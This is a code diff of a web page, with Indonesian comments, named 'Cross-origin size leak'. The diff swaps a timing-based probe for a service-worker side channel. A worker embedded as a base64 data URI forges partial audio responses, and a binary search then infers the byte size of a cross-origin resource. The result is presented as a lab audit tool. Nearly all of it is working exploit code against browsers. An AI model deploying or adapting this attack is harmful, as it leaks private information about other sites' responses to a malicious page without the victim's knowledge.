@@ -26,11 +26,11 @@
 <body>
     
     <h1>Cross-origin size leak</h1>
-    <small>Compatible with <strong>GitHub Pages & Chrome</strong> - Pure Timing Engine</small>
+    <small>Compatible with <strong>GitHub Pages & Chrome</strong> - Base64 SW Engine</small>
 
     <div class="panel">
         <form id="form" method="POST">
-          <input name="url" placeholder="https://google.com" value="https://google.com"/>
+          <input name="url" placeholder="https://www.google.com/robots.txt" value="https://www.google.com/robots.txt"/>
           <button type="submit">Run Search Chain</button>
           <button id="export-log-report" type="button" style="background: #142414; display: none;">Download Audit Report (.TXT)</button>
         </form>
@@ -43,16 +43,59 @@
         const form = document.getElementById("form");
         let auditReports = []; 
 
+        // 1. REKAYASA INTEGRASI WORKER: Enkapsulasi Kode sw.js Anda ke dalam String Teks
+        const rawWorkerScript = `
+            'use strict';
+            let response;
+            self.addEventListener("install", () => { self.skipWaiting(); });
+            self.addEventListener("activate", (e) => { e.waitUntil(self.clients.claim()); });
+            self.addEventListener("fetch", async (e) => {
+                if (!e.request.url.includes('size=')) return;
+                
+                let url = new URL(e.request.url);
+                let urlParams = new URLSearchParams(url.search);
+                let size = urlParams.get("size");
+                let body = "A".repeat(Number(size));
+
+                if (e.request.headers.get("range") === "bytes=0-") {
+                    e.respondWith(new Response(body, {status: 206, headers: {
+                        "Content-Type": "audio/mp4",
+                        "Content-Range": "bytes 0-1/13337"
+                    }}));
+                } else if (e.request.headers.get("range") === "bytes=" + Number(size) + "-") {
+                    response = await fetch(e.request);
+                } else if (e.request.url.includes("/mock.css")) {
+                    e.respondWith(response.clone());
+                }
+            });
+        `;
+
+        // Konversi script teks menjadi format Data URI Base64 yang diizinkan oleh Chrome Registry
+        if ("serviceWorker" in navigator) {
+            const base64Script = btoa(unescape(encodeURIComponent(rawWorkerScript)));
+            const dataUriWorker = `data:text/javascript;base64,${base64Script}`;
+
+            navigator.serviceWorker.register(dataUriWorker).then(registration => {
+                if (!navigator.serviceWorker.controller) {
+                    // Paksa reload satu kali jika controller worker belum menempel pada sesi DOM halaman
+                    setTimeout(() => { location.reload(); }, 250);
+                }
+            }).catch(err => {
+                console.error("Critical: Gagal mendaftarkan Base64 Service Worker -> ", err);
+            });
+        }
+
+        // 2. LOGIKA KENDALI UTAMA: PIPA KOMPUTASI PENCARIAN BINER
         const binarySearchSize = async (url, minSize, maxSize) => {
             let foundSize = -1;
             document.getElementById("export-log-report").style.display = "none";
-            writeMsg(url, "success", `Memulai komputasi pipa biner berbasis Pure Network Timing...`);
+            writeMsg(url, "success", `Menginisialisasi pipeline rantai biner berbasis interupsi partial range...`);
             
             while (minSize <= maxSize) {
                 let mid = Math.floor((minSize + maxSize) / 2);
                 
-                // Eksekusi asinkron sekuensial mengukur latensi pemuatan media
-                let isAtLeastMid = await checkSizeThroughTimingAPI(url, mid);
+                // Menunggu penanganan respons asinkron selesai sepenuhnya secara sekuensial
+                let isAtLeastMid = await checkSizeThroughSideChannel(url, mid);
                 
                 if (isAtLeastMid) {
                     foundSize = mid + 1;
@@ -61,59 +104,44 @@
                     maxSize = mid - 1;
                 }
                 
-                // Jeda mikro memberikan kesempatan mesin browser melakukan garbage collection memori
-                await new Promise(r => setTimeout(r, 30));
+                // Jeda mikro untuk membebaskan RAM internal peramban melakukan pembersihan objek
+                await new Promise(r => setTimeout(r, 20));
             }
-            writeMsg(url, "success", `Rantai Pipa Selesai: Kapasitas dokumen terisolasi -> <b>${foundSize}</b> bytes.`);
+            writeMsg(url, "success", `Rantai Pipa Selesai: Kapasitas dokumen target terverifikasi -> <b>${foundSize}</b> bytes.`);
             document.getElementById("export-log-report").style.display = "inline-block";
         };
 
-        // STRATEGI PENGUATAN: Pencatatan Durasi via Performance API (Bypass Ketergantungan Service Worker)
-        const checkSizeThroughTimingAPI = (url, size) => {
+        // 3. PIPELINE VALIDASI SEKUANSIAL & PEMBOBOLAAN RESPONS MOCK
+        const checkSizeThroughSideChannel = (url, size) => {
             return new Promise((resolve) => {
-                const uniqueString = `cb_${Math.round(Math.random() * 1000000)}`;
-                const targetUrl = `${url}?size=${size}&${uniqueString}`;
-                
                 let sound = document.createElement("audio");
                 
-                const processTimingMetrics = () => {
-                    // Mengekstrak metrik performa pemuatan objek langsung dari memori internal peramban
-                    const entries = performance.getEntriesByName(targetUrl);
-                    
-                    if (entries.length > 0) {
-                        const duration = entries[0].duration;
-                        // Side-Channel Rule: Respons di bawah ambang batas mengonfirmasi indikasi ukuran byte yang cocok
-                        if (duration < 150) {
-                            writeMsg(url, "error", `Analisis Vektor: Tidak mengandung kapasitas ukuran <b>${size - 1}</b> bytes [Respon: ${Math.round(duration)}ms].`);
-                            cleanup(sound);
-                            resolve(false);
-                            return;
-                        }
+                const terminateAndResolve = async (isTrueSize) => {
+                    if (sound) {
+                        sound.src = ""; 
+                        sound.onerror = null;
+                        sound.remove();
+                        sound = null; 
                     }
-                    
-                    cleanup(sound);
-                    resolve(true);
+                    resolve(isTrueSize);
                 };
 
-                // Mengikat penanganan untuk memastikan metrik jaringan ditangkap saat pemuatan berhenti
-                sound.onerror = processTimingMetrics;
-                sound.onstalled = processTimingMetrics;
-                sound.onabort = processTimingMetrics;
+                sound.onerror = async () => {
+                    try {
+                        // Menguji status penyaringan via rute interupsi kloning respons maket
+                        await fetch("/mock.css?size=" + size + "&cb=" + Math.random(), { mode: "no-cors" });
+                        writeMsg(url, "error", `Verifikasi Vektor: Tidak mengandung kapasitas ukuran <b>${size - 1}</b> bytes.`);
+                        terminateAndResolve(false);
+                    } catch(err) {
+                        terminateAndResolve(true);
+                    }
+                };
                 
                 document.body.appendChild(sound);
-                sound.src = targetUrl;
+                // Menembakkan parameter payload biner gabungan dengan penolak cache otomatis
+                sound.src = `${url}?size=${size}&cb=${Math.random()}`;
             });
         };
-
-        function cleanup(element) {
-            if (element) {
-                element.src = "";
-                element.onerror = null;
-                element.onstalled = null;
-                element.onabort = null;
-                element.remove();
-            }
-        }
 
         const writeMsg = (url, status, message) => {
             const timestamp = new Date().toLocaleTimeString();
@@ -129,19 +157,17 @@
             let minSize = 1;
             let maxSize = 10000;
             auditReports = []; 
-            // Bersihkan entri performa lama agar penghitungan timing mulai dari nol
-            performance.clearResourceTimings();
             binarySearchSize(url, minSize, maxSize);
         };
 
-        // LAYANAN EKSPOR LAPORAN AUDIT LABORATORIUM
+        // LAYANAN EKSPOR BERKAS LAPORAN TEKNIS AUDIT LAB
         document.getElementById("export-log-report").addEventListener("click", () => {
             if (auditReports.length === 0) return;
             
             const textBlob = new Blob([auditReports.join("\r\n")], { type: "text/plain" });
             const downloadAnchor = document.createElement("a");
             
-            downloadAnchor.download = `size_leak_timing_audit_${Math.round(Date.now()/1000)}.txt`;
+            downloadAnchor.download = `size_leak_fullchain_${Math.round(Date.now()/1000)}.txt`;
             downloadAnchor.href = window.URL.createObjectURL(textBlob);
             downloadAnchor.style.display = "none";
             
